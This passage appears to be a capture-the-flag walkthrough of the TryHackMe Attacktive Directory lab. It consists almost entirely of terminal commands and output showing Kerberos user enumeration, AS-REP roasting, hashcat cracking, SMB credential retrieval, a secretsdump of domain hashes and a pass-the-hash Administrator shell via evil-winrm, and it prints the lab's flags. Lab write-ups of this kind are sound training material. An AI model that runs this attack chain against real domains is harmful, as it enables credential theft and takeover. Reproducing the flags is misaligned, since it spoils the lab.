2020/07/14 14:02:09 >  [+] VALID USERNAME:       administrator@spookysec.local
2020/07/14 14:02:09 >  [+] VALID USERNAME:       backup@spookysec.local
2020/07/14 14:02:09 >  [+] VALID USERNAME:       paradox@spookysec.local
2020/07/14 14:02:10 >  [+] VALID USERNAME:       JAMES@spookysec.local
2020/07/14 14:02:10 >  [+] VALID USERNAME:       Robin@spookysec.local
2020/07/14 14:02:12 >  [+] VALID USERNAME:       Administrator@spookysec.local
2020/07/14 14:02:14 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2020/07/14 14:02:15 >  [+] VALID USERNAME:       Paradox@spookysec.local
2020/07/14 14:02:18 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2020/07/14 14:02:19 >  [+] VALID USERNAME:       ori@spookysec.local
2020/07/14 14:02:20 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2020/07/14 14:02:30 >  Done! Tested 100000 usernames (16 valid) in 21.619 seconds
```

# GetNPUsers
```
root@kali:~# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:413: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if domain is '':
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:11b13605883c63bcc29decf70073e38a$dee94942a32f85224b1966bf4274cae138512303509513ffecdee9ebc9f6b5d78e45e268ac336059e8fe5c66041161855077e4ae82f82afa9e3eab0a65e7ca34ee58fb22fe66bde8a763e940cba3929d42af7959b8fecbfd98ff7f1075c90b02c3a602842b3497d3cfc0d53c40ce76407df7eab8bfa6eafe2c2e7de70644db5dab6e43ba0966a7fda35c3950cd31dba17639329fd9f8c1031871d9520c662275f28f7d386e8571955549c1c6643e5160c27a00c6243836c4f331aae58de1cc6ebedc0330e84f2cfb650ca2aafcd5810a9979b447012681083d68f009277775883645676ae95dbc2fb75018652a33b19dfceb
root@kali:~#
```

- https://hashcat.net/wiki/doku.php?id=example_hashes

```
root@kali:~# hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt   --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 1024/2953 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:11b13605883...9dfceb
Time.Started.....: Fri Jul 17 12:52:57 2020 (5 secs)
Time.Estimated...: Fri Jul 17 12:53:29 2020 (27 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   434.3 kH/s (12.45ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 2465792/14344385 (17.19%)
Rejected.........: 0/2465792 (0.00%)
Restore.Point....: 2465792/14344385 (17.19%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ~~joshuajohn~~ -> zwartsluis7

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:11b13605883c63bcc29decf70073e38a$dee94942a32f85224b1966bf4274cae138512303509513ffecdee9ebc9f6b5d78e45e268ac336059e8fe5c66041161855077e4ae82f82afa9e3eab0a65e7ca34ee58fb22fe66bde8a763e940cba3929d42af7959b8fecbfd98ff7f1075c90b02c3a602842b3497d3cfc0d53c40ce76407df7eab8bfa6eafe2c2e7de70644db5dab6e43ba0966a7fda35c3950cd31dba17639329fd9f8c1031871d9520c662275f28f7d386e8571955549c1c6643e5160c27a00c6243836c4f331aae58de1cc6ebedc0330e84f2cfb650ca2aafcd5810a9979b447012681083d68f009277775883645676ae95dbc2fb75018652a33b19dfceb:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:11b13605883...9dfceb
Time.Started.....: Fri Jul 17 12:52:57 2020 (13 secs)
Time.Estimated...: Fri Jul 17 12:53:10 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   438.2 kH/s (12.29ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5840896/14344385 (40.72%)
Rejected.........: 0/5840896 (0.00%)
Restore.Point....: 5832704/14344385 (40.66%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: mandj4e -> mamitaraquel

Started: Fri Jul 17 12:52:54 2020
Stopped: Fri Jul 17 12:53:10 2020
root@kali:~#
```


```
oot@kali:~# smbclient -L spookysec.local -U svc-admin
Enter WORKGROUP\svc-admin's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```


```
root@kali:~# smbclient \\\\spookysec.local\\backup -U svc-admin
Enter WORKGROUP\svc-admin's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 19:08:39 2020
  ..                                  D        0  Sat Apr  4 19:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 19:08:53 2020

                8247551 blocks of size 4096. 5264458 blocks available
smb: \> help
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
geteas         hardlink       help           history        iosize
lcd            link           lock           lowercase      ls
l              mask           md             mget           mkdir
more           mput           newer          notify         open
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir
posix_unlink   posix_whoami   print          prompt         put
pwd            q              queue          quit           readlink
rd             recurse        reget          rename         reput
rm             rmdir          showacls       setea          setmode
scopy          stat           symlink        tar            tarmode
timeout        translate      unlock         volume         vuid
wdel           logon          listconnect    showconnect    tcon
tdis           tid            utimes         logoff         ..
!
smb: \> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
smb: \> more backup_credentials.txt
getting file \backup_credentials.txt of size 48 as /tmp/smbmore.yuwFEP (15.6 KiloBytes/sec) (average 5.5 KiloBytes/sec)
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
/tmp/smbmore.yuwFEP (END)
```

```
root@kali:~# echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw|base64 -d
backup@spookysec.local:backup2517860
root@kali:~#
```

```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket

pip3 install -r /opt/impacket/requirements.txt

cd /opt/impacket/ && python3 ./setup.py install
```


```
root@kali:/opt/impacket# secretsdump.py -just-dc backup@spookysec.local
Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:6c80ff7b1367f355c8a9ae6a192c4972:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c431e7e3555aeb5b63cbdfee3024d56f4b7f10eaba6c3f94d9a1524e76a26a49
Administrator:aes128-cts-hmac-sha1-96:f955ac2d89620b2a8dcd9837105445ff
Administrator:des-cbc-md5:6d5edfa173d9d6ae
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:e9c5ce18d0f889bff703d8a8c2297a99494a4bffa89dbe144aa3b9ba8aeec0c2
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:3944d9f036da6461404babf3c572f173
ATTACKTIVEDIREC$:des-cbc-md5:5ddc16e0462c0e23
[*] Cleaning up...
root@kali:/opt/impacket#
```

```
gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git



root@kali:~/evil-winrm# ruby evil-winrm.rb -h

Evil-WinRM shell v2.3

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -h, --help                       Display this help message

root@kali:~/evil-winrm# ruby evil-winrm.rb -i 10.10.230.210 -H e4876a80a723612986d7609aa5ebc12b -u Administrator

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         4/4/2020  11:19 AM                3D Objects
d-r---         4/4/2020  11:19 AM                Contacts
d-r---         4/4/2020  11:39 AM                Desktop
d-r---         4/4/2020  12:09 PM                Documents
d-r---         4/4/2020  11:19 AM                Downloads
d-r---         4/4/2020  11:19 AM                Favorites
d-r---         4/4/2020  11:19 AM                Links
d-r---         4/4/2020  11:19 AM                Music
d-r---         4/4/2020  11:19 AM                Pictures
d-r---         4/4/2020  11:19 AM                Saved Games
d-r---         4/4/2020  11:19 AM                Searches
d-r---         4/4/2020  11:19 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> dir Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator> type root.txt
Cannot find path 'C:\Users\Administrator\root.txt' because it does not exist.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator> cat root.txt
Cannot find path 'C:\Users\Administrator\root.txt' because it does not exist.
At line:1 char:1
+ cat root.txt
+ ~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator> Get-Content root.txt
Cannot find path 'C:\Users\Administrator\root.txt' because it does not exist.
At line:1 char:1
+ Get-Content root.txt
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator> Get-Content .\root.txt
Cannot find path 'C:\Users\Administrator\root.txt' because it does not exist.
At line:1 char:1
+ Get-Content .\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator> cat Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
*Evil-WinRM* PS C:\Users\Administrator> cd ../
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/4/2020  11:26 AM                Administrator
d-----         4/4/2020  12:19 PM                backup
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                svc-admin


*Evil-WinRM* PS C:\Users> cd backup
*Evil-WinRM* PS C:\Users\backup> dir Destop
Cannot find path 'C:\Users\backup\Destop' because it does not exist.
At line:1 char:1
+ dir Destop
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\backup\Destop:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\Users\backup> dir


    Directory: C:\Users\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         4/4/2020  12:19 PM                3D Objects
d-r---         4/4/2020  12:19 PM                Contacts
d-r---         4/4/2020  12:19 PM                Desktop
d-r---         4/4/2020  12:19 PM                Documents
d-r---         4/4/2020  12:19 PM                Downloads
d-r---         4/4/2020  12:19 PM                Favorites
d-r---         4/4/2020  12:19 PM                Links
d-r---         4/4/2020  12:19 PM                Music
d-r---         4/4/2020  12:19 PM                Pictures
d-r---         4/4/2020  12:19 PM                Saved Games
d-r---         4/4/2020  12:19 PM                Searches
d-r---         4/4/2020  12:19 PM                Videos


*Evil-WinRM* PS C:\Users\backup> cd Desktop
*Evil-WinRM* PS C:\Users\backup\Desktop> dir


    Directory: C:\Users\backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
*Evil-WinRM* PS C:\Users\backup\Desktop> cd ../../
*Evil-WinRM* PS C:\Users> cd svc-admin
*Evil-WinRM* PS C:\Users\svc-admin> dir


    Directory: C:\Users\svc-admin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         4/4/2020  12:18 PM                3D Objects
d-r---         4/4/2020  12:18 PM                Contacts
d-r---         4/4/2020  12:18 PM                Desktop
d-r---         4/4/2020  12:18 PM                Documents
d-r---         4/4/2020  12:18 PM                Downloads
d-r---         4/4/2020  12:18 PM                Favorites
d-r---         4/4/2020  12:18 PM                Links
d-r---         4/4/2020  12:18 PM                Music
d-r---         4/4/2020  12:18 PM                Pictures
d-r---         4/4/2020  12:18 PM                Saved Games
d-r---         4/4/2020  12:18 PM                Searches
d-r---         4/4/2020  12:18 PM                Videos


*Evil-WinRM* PS C:\Users\svc-admin> cd Desktop
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> dir


    Directory: C:\Users\svc-admin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt


*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
*Evil-WinRM* PS C:\Users\svc-admin\Desktop>
```
